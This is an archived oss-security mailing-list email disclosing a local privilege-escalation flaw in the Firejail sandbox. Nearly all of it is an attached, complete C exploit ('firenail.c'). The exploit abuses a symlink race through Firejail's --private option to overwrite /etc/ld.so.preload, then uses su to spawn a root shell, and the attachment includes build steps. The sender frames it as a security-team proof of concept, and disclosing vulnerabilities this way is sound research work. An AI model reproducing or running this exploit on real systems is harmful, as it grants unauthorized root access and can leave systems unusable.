X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3020" "Wednesday" "4" "January" "2017" "14:12:48" "+0100" "Sebastian Krahmer" "krahmer@suse.com" "<20170104131248.GA28596@suse.de>" "126" "[oss-security] Firejail local root exploit" "^Cc:" nil nil "1" "2017010413:12:48" "[oss-security] Firejail local root exploit" (number mark "        krahmer@suse Jan  4  126/3020  " thread-indent "\"[oss-security] Firejail local root exploit\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 4026 invoked by uid 550); 4 Jan 2017 13:13:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3958 invoked from network); 4 Jan 2017 13:13:00 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20170104131248.GA28596@suse.de>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="n8g4imXOkfNTN/H1"
Content-Disposition: inline
Organization: SUSE Linux GmbH, GF: Felix =?utf-8?Q?Imend?=
 =?utf-8?Q?=F6rffer?= =?utf-8?Q?=2C?= Jane Smithard, Graham Norton, HRB 21284
 (AG Nuernberg)
User-Agent: Outlook
Cc: netblue30@yahoo.com
Date: Wed, 4 Jan 2017 14:12:48 +0100
From: Sebastian Krahmer <krahmer@suse.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Firejail local root exploit
To: oss-security@lists.openwall.com

--n8g4imXOkfNTN/H1
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi

Please find attached PoC for firejail, which seems to be quite
popular sandboxing tool.

Sebastian

-- 

~ perl self.pl
~ $_='print"\$_=\47$_\47;eval"';eval
~ krahmer@suse.com - SuSE Security Team


--n8g4imXOkfNTN/H1
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="firenail.c"

/* firejail local root exploit (host to host)
 *
 * (C) 2017 Sebastian Krahmer under the GPL.
 *
 * WARNING: This exploit uses ld.so.preload technique.
 * If you are in bad luck, you may end up with an unusable system.
 * SO BE WARNED. ONLY TEST IT IN YOUR SAFE VM's.
 *
 * Get the beauty that this is a shared lib and a running
 * executable at the same time, as we tamper with /etc/ld.so.preload
 *
 * Therefore you have to compile it like this:
 *
 * $ cc -fPIC -fpic -std=c11 -Wall -pedantic -c firenail.c
 * $ gcc -shared -pie firenail.o -o firenail
 * $ ./firenail
 *
 * DO NOT TELL ME THAT SELINUX WOULD HAVE PREVENTED THIS EXPLOIT.
 * IF I WAS ABOUT TO BYPASS SELINUX ALONG, I WOULD HAVE DONE THE
 * EXPLOIT DIFFERENTLY.
 *
 * Analysis: Sandboxing is cool, but it has to be done right.
 * Firejail has too broad attack surface that allows users
 * to specify a lot of options, where one of them eventually
 * broke by accessing user-files while running with euid 0.
 * There are some other similar races. Turns out that it can be
 * _very difficult_ to create a generic sandbox suid wrapper thats
 * secure but still flexible enough to sandbox arbitrary binaries.
 *
 * Tested with latest commit 699ab75654ad5ab7b48b067a2679c544cc8725f6.
 */
#define _POSIX_C_SOURCE 200212
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>


const char *const ldso = "/etc/ld.so.preload";

int main();

__attribute__((constructor)) void init(void)
{
	if (geteuid())
		return;

	unlink(ldso);
	char *sh[] = {"/bin/sh", "--noprofile", "--norc", NULL};
	setuid(0);
	setgid(0);
	execve(*sh, sh, NULL);
	exit(1);
}


void die(const char *s)
{
	perror(s);
	exit(errno);
}


int main()
{
	printf("[*] fire(j|n)ail local root exploit 2017\n\n");

	char me[4096] = {0}, *home = getenv("HOME");
	if (!home)
		die("[-] no $HOME");
	if (readlink("/proc/self/exe", me, sizeof(me) - 1) < 0)
		die("[-] Unable to find myself");

	char path[256] = {0};
	snprintf(path, sizeof(path) - 1, "%s/.firenail", home);
	if (mkdir(path, 0700) < 0 && errno != EEXIST)
		die("[-] mkdir");

	snprintf(path, sizeof(path) - 1, "%s/.firenail/.Xauthority", home);
	if (symlink(ldso, path) < 0 && errno != EEXIST)
		die("[-] symlink");

	system("firejail --private=.firenail /usr/bin/id");

	int fd = open(ldso, O_RDWR|O_TRUNC);
	if (fd < 0)
		die("[-] open");
	write(fd, me, strlen(me));
	write(fd, "\n", 1);
	close(fd);

	char *su[] = {"/bin/su", NULL};
	execve(*su, su, NULL);
	die("[-] execve su");

	return -1;
}


--n8g4imXOkfNTN/H1--
